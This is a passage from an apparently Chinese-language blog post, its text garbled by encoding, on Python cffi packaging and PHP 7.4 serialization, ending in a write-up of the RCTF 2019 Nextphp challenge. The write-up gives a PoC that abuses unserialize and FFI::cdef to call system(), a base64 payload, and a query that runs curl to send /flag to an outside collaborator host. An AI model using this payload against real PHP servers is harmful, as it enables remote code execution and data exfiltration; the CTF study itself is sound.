&lt;span style="color:#75715e"># linking against:&lt;/span>
&lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ª&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
&lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åçš„cffi_modulesæŒ‡å®šäº†éœ€è¦ç”Ÿæˆffiå®ä¾‹çš„æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pyhon setup.py install
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
&lt;p>æ²¡æƒ³åˆ°æ˜¯ä¸ªæŠ¥é”™ï¼Œä»”ç»†çœ‹ä¸€ä¸‹åŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯æŠŠä¹‹å‰çš„fnmatch.hä¸­çš„åç§»æ¢æˆ16è¿›åˆ¶&lt;/p>
&lt;p>å†æ¬¡æ‰§è¡Œå°±å¥½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°è¿™ç§æ–¹å¼æ¯”ä¹‹å‰ç”Ÿæˆçš„æ–‡ä»¶éƒ½è¦å¤šï¼Œç›¸å½“äºå®‰è£…äº†ä¸€ä¸ªæ¨¡å—&lt;/p>
&lt;p>ç„¶åæ˜¯ä¸€ä¸ªtest_fnmatch.pyï¼Œæ³¨æ„è¿™é‡Œç›´æ¥ç”¨ç»™å‡ºçš„æ–‡ä»¶è¿˜æ˜¯ä¼šæŠ¥é”™ï¼ŒæŠŠä¸‹å›¾é«˜äº®çš„åœ°æ–¹æ¢æˆ0x1&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
&lt;p>å†æ‰§è¡Œå°±å¥½äº†&lt;/p>
&lt;p>cffiå’Œctypesè¿˜æœ‰å¾ˆå¤šçš„èŠ±æ´»ï¼Œé‰´äºæˆ‘çš„ä»£ç èƒ½åŠ›ä¸€èˆ¬ï¼ˆcå’Œpythonéƒ½æ˜¯å‹‰å¼ºå¤Ÿç”¨çš„æ°´å¹³ï¼‰ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œæ›´å¤šçš„ä¸œè¥¿è¿˜æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£æ¯”è¾ƒé è°±ï¼ˆé“¾æ¥è´´åœ¨æœ€åäº†&lt;/p>
&lt;p>â€”â€”â€”â€”ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆFFI in PHPä»‹ç»çš„è¿˜ä¸å¦‚FFI in Pythonçš„å¤šï¼Ÿ&lt;/p>
&lt;p>emmmmm è¿™ä¸ªå˜› æ‰ä¸ä¼šè¯´æ˜¯å› ä¸ºæ‡’å‘¢&lt;/p>
&lt;h2 id="serializable">Serializable&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>å·²æœ‰çš„ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•æ€»æ˜¯æœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªæè®®æ–°å¢äº†&lt;code>__serialize()&lt;/code>ï¼Œ&lt;code>__unserialize()&lt;/code>ï¼Œ&lt;code>serialize()&lt;/code>ï¼Œ&lt;code>unserialize()&lt;/code>å’Œ&lt;code>Serializable()&lt;/code>&lt;/p>
&lt;p>&lt;code>serialize()&lt;/code>æ£€æŸ¥åˆ°&lt;code>__serialize()&lt;/code>çš„å­˜åœ¨åå°†åœ¨åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œï¼Œè¿”å›åºåˆ—åŒ–å½¢å¼çš„æ•°ç»„ï¼Œå¦‚æœ‰é”™æŠ›å‡ºTypeErrorï¼›å¦‚æœåŒæ—¶æœ‰&lt;code>__serialize()&lt;/code>å’Œ&lt;code>__sleep()&lt;/code>ï¼Œåè€…å°†è¢«å¿½ç•¥ï¼›å¦‚æœå¯¹è±¡å®ç°äº†&lt;code>Serializable()&lt;/code>æ¥å£ï¼Œæ¥å£çš„&lt;code>serialize()&lt;/code>å°†è¢«å¿½ç•¥ï¼Œç±»ä¸­çš„&lt;code>__serialize()&lt;/code>å°†è¢«è°ƒç”¨ï¼›ååºåˆ—åŒ–æ—¶è§¦å‘&lt;code>__unserialize()&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”å¥½å‹¾å…«å¤æ‚çš„ï¼Œå»ºè®®ç›´æ¥çœ‹æ–‡æ¡£&lt;/p>
&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœç†Ÿè¯»ä»¥ä¸Šä¸‰ä¸ªæ–‡æ¡£ï¼Œè¿™ä¸ªé¢˜å°±å¾ˆå¥½å‡ºäº†&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æŠŠfuncè®¾ä¸º&lt;code>FFI:cdef&lt;/code>ï¼Œargè®¾ä¸º&lt;code>int system(char *command)&lt;/code>æ¥æ‰§è¡Œcä»£ç ç»•è¿‡php.iniä¸­çš„é™åˆ¶ï¼›åŒæ—¶ç”±äºSerializableçš„ç§ç§æ–°ç‰¹æ€§ï¼ˆå‡ºé¢˜äººä¹Ÿåœ¨è¿™é‡Œè®¾äº†å‘ï¼‰ï¼Œæˆ‘ä»¬åœ¨æ„é€ pocæ—¶è¦åˆ é™¤&lt;code>__serialize()&lt;/code>ï¼Œé˜²æ­¢ç›´æ¥returnè¿›å‘é‡Œäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>éšååœ¨ä¼ å…¥çš„åœ°æ–¹æ‰§è¡Œ&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>ï¼Œç›´æ¥curlå¤–å¸¦flag&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()['ret']-&amp;gt;system(&amp;quot;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;quot;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨è¿™ä¸ªé¢˜å‡ºç°ä¹‹åèšå‰‘è¿˜ä¸“é—¨å‡ºäº†å¯¹åº”çš„æ’ä»¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
&lt;p>ä½†æ˜¯å¤šæ¬¡å°è¯•å¤±è´¥ï¼Œä¹‹åçœ‹åˆ°äº†è¿™ä¸ª&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>ä¹‹åå†çœ‹&lt;a href="https://wiki.php.net/rfc/ffi">å®˜æ–¹æ–‡æ¡£&lt;/a>è¿˜æœ‰&lt;a href="https://www.laruence.com/2020/03/11/5475.html">è¿™ä¸€ç¯‡&lt;/a>å°±æ˜ç™½äº†&lt;/p>
